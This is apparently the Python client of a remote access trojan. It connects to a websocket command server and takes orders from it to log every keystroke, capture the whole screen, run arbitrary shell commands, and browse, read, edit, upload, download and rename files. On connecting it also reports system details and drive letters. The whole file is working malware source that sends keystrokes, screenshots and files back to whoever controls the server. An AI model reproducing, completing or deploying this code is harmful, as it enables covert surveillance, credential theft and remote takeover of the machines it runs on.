import string
import sys
import websocket
import keyboard
import os
import platform
import uuid
from tempfile import TemporaryFile
import base64
import zlib
from struct import pack, calcsize, unpack
import json
import ctypes
import lzma
import platform

if platform.system().lower() == 'windows':
    GetWindowDC = ctypes.windll.user32.GetWindowDC
    GetSystemMetrics = ctypes.windll.user32.GetSystemMetrics
    SelectObject = ctypes.windll.gdi32.SelectObject
    DeleteObject = ctypes.windll.gdi32.DeleteObject
    BitBlt = ctypes.windll.gdi32.BitBlt
    GetDIBits = ctypes.windll.gdi32.GetDIBits
    CreateCompatibleDC = ctypes.windll.gdi32.CreateCompatibleDC
    CreateCompatibleBitmap = ctypes.windll.gdi32.CreateCompatibleBitmap


class Data:
    """
    定义基本数据包结构
    """

    def __init__(self):
        self.data = b''
        self.v_uid = ''
        self.uid = Client.uid
        self.type = ''
        self.raw = None

    def json(self) -> dict:
        return {"code": 0, "data": base64.b64encode(self.data).decode(), "v_uid": self.v_uid, "uid": self.uid, "type": self.type, "raw": self.raw}


class File:
    def __init__(self):
        pass

    @staticmethod
    def rename(src, dst):
        os.rename(src, dst)
        return {"msg": "success"}

    @staticmethod
    def download(path):
        with open(path, 'rb') as f:
            return f.read()

    @staticmethod
    def edit(path, data):
        if data:
            with open(path, "w", encoding="utf8") as f:
                f.write(data)
                return {"msg": "success"}
        else:
            with open(path, "r", encoding="utf8") as f:
                return {"msg": "success", "data": f.read()}

    @staticmethod
    def save_file(path: str, data: bytes):
        with open(path, 'wb') as f:
            f.write(data)
        return {"msg": "success"}

    @staticmethod
    def dir(path):
        _dir = []
        try:
            for filename in os.listdir(path):
                full_path = os.path.join(path, filename)
                dirname = os.path.dirname(os.path.join(path, filename))
                last_dirname = os.path.realpath(os.path.dirname(os.path.join(dirname, "../")))
                mtime = os.path.getmtime(full_path) * 1000
                atime = os.path.getatime(full_path) * 1000
                ctime = os.path.getctime(full_path) * 1000
                file_size = os.path.getsize(full_path)
                file_abspath = os.path.abspath(full_path)
                _dir.append({"filename": filename, "file_type": os.path.isdir(full_path), "mtime": mtime,"file_size": file_size,"file_abspath": file_abspath, "atime": atime, "ctime": ctime, "dirname": dirname, "last_dirname": last_dirname})
            return _dir
        except Exception as e:
            return _dir


class Client:
    uid = uuid.uuid4().hex

    def __init__(self, ws: str):
        self.ws = websocket.WebSocketApp(ws, on_message=self.on_message, on_open=self.on_open, keep_running=True, on_close=self.on_close, on_error=self.on_error)
        websocket.enableTrace(False)
        self.key_file = TemporaryFile(mode="a+")

    def key(self, x):
        """
        记录按键
        :param x:
        :return:
        """
        if x.event_type == "down" and x.name.find("shift") == -1:
            if x.name == "enter":
                self.key_file.writelines("\n")
            else:
                self.key_file.writelines(x.name + " ")

    def on_message(self, msg):
        if not msg:
            return None
        msg = json.loads(msg)
        data_bean = Data()
        data_bean.v_uid = msg['v_uid']
        if msg.get("type") == "capture":
            data_bean.data = self.window_capture()  # window capture
            self.send(data_bean.json())
        if msg.get("type") == "key":
            self.key_file.seek(0)
            data_bean.data = self.key_file.read().encode()  # key read from file
            self.send(data_bean.json())
        if msg.get("type") == "shell":
            data_bean.data = os.popen(msg["data"]).read().encode()
            self.send(data_bean.json())
        if msg.get("type") == "dir":
            data_bean.raw = File.dir(msg["data"])
            self.send(data_bean.json())
        if msg.get("type") == "rename":
            raw_data = msg["data"]
            data_bean.raw = File.rename(raw_data["file_abspath"], os.path.join(raw_data["dirname"], raw_data["rename"]))
            self.send(data_bean.json())
        if msg.get("type") == "upload":
            raw_path = msg["data"]["path"]
            data_bean.raw = File.save_file(raw_path, base64.b64decode(msg["data"]["data"]))
            self.send(data_bean.json())
        if msg.get("type") == "edit":
            raw_path = msg["data"]["path"]
            data_bean.raw = File.edit(raw_path, msg["data"].get("data"))
            self.send(data_bean.json())
        if msg.get("type") == "download":
            data_bean.data = File.download(msg["data"]["file_abspath"])
            self.send(data_bean.json())

    def on_open(self):
        data_bean = Data()
        data_bean.type = "init"
        data = data_bean.json()
        data.update({"system": [platform.system(), platform.version(), platform.processor()]})
        disk_list = []
        for c in string.ascii_uppercase:
            disk = c + ':'
            if os.path.isdir(disk):
                disk_list.append(disk)
        data.update({"disk": disk_list})
        self.send(data)

    def on_close(self):
        sys.exit(0)
        pass

    def on_error(self, e):
        pass

    def send(self, data: dict):
        data = json.dumps(data).encode("utf8")
        self.ws.send(data)

    @staticmethod
    def window_capture():
        left, top, width, height = (0, 0, GetSystemMetrics(0), GetSystemMetrics(1))
        bmi = pack('LHHHH', calcsize('LHHHH'), width, height, 1, 32)
        srcdc = GetWindowDC(0)
        memdc = CreateCompatibleDC(srcdc)
        svbmp = CreateCompatibleBitmap(srcdc, width, height)
        SelectObject(memdc, svbmp)
        BitBlt(memdc, 0, 0, width, height, srcdc, left, top, 13369376)
        _data = ctypes.create_string_buffer(height * width * 4)
        GetDIBits(memdc, svbmp, 0, height, _data, bmi, 0)
        DeleteObject(memdc)
        data = bytes(_data)
        rgb = bytearray(width * height * 3)
        rgb[0::3], rgb[1::3], rgb[2::3] = data[2::4], data[1::4], data[0::4]
        data = rgb
        level = 9
        line = width * 3
        png_filter = pack(">B", 0)
        scanlines = b"".join(
            [png_filter + data[y * line: y * line + line] for y in range(height)][::-1]
        )
        magic = pack(">8B", 137, 80, 78, 71, 13, 10, 26, 10)
        ihdr = [b"", b"IHDR", b"", b""]
        ihdr[2] = pack(">2I5B", width, height, 8, 2, 0, 0, 0)
        ihdr[3] = pack(">I", zlib.crc32(b"".join(ihdr[1:3])) & 0xFFFFFFFF)
        ihdr[0] = pack(">I", len(ihdr[2]))
        idat = [b"", b"IDAT", zlib.compress(scanlines, level), b""]
        idat[3] = pack(">I", zlib.crc32(b"".join(idat[1:3])) & 0xFFFFFFFF)
        idat[0] = pack(">I", len(idat[2]))
        iend = [b"", b"IEND", b"", b""]
        iend[3] = pack(">I", zlib.crc32(iend[1]) & 0xFFFFFFFF)
        iend[0] = pack(">I", len(iend[2]))
        png_data = magic + b"".join(ihdr + idat + iend)
        png_data = lzma.compress(png_data, preset=9, format=lzma.FORMAT_ALONE)
        return png_data


if __name__ == '__main__':
    WS_URL = "ws://127.0.0.1:5000/ping"
    client = Client(WS_URL)
    keyboard.hook(client.key)
    client.ws.run_forever(ping_interval=10)
